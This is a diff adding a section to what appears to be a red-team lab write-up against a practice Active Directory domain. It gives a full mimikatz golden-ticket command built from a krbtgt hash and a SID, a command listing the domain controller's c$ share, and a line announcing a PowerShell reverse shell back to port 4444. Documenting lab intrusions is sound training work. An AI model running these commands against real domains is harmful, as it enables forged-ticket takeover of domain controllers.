@@ -496,3 +496,24 @@ Found 4 machines connected to the domain controller.
 ![Screenshot 2023-07-08 at 9 40 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/aaee5b8e-c061-4db2-9818-0b698f015f82)
 
 Back to mimikatz again. Using the SID of the child-admin and NTLM of the krbtgt, I will be forging my golden ticket to be able to access the domain controller fully.
+
+## Golden Ticket
+
+```bash
+kerberos::golden /User:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a startoffset:0 /endin:600 /renewmax:10080 /ptt
+```
+![Screenshot 2023-07-09 at 11 15 33 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/388f0904-3ee2-4b27-817c-e7c8b4393566)
+
+Exiting from mimikatz, from here we know that our golden ticket is temporarily saved in the machine’s memory.
+
+Moving on, initiate an enquiry if I can see the domain controller c$ directory.
+
+```bash
+PS > dir \\RED-CHILDDC.child.redteam.corp\c$
+```
+
+Great, this is the one I missed - “\\RED_CHILDDC.child.redteam.corp”
+
+![Screenshot 2023-07-08 at 10 19 09 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/d8004b97-4217-4e4b-907e-fc859b9335f6)
+
+Now we are creating a powershell TCP that would connect back to our attacking machine on port 4444.
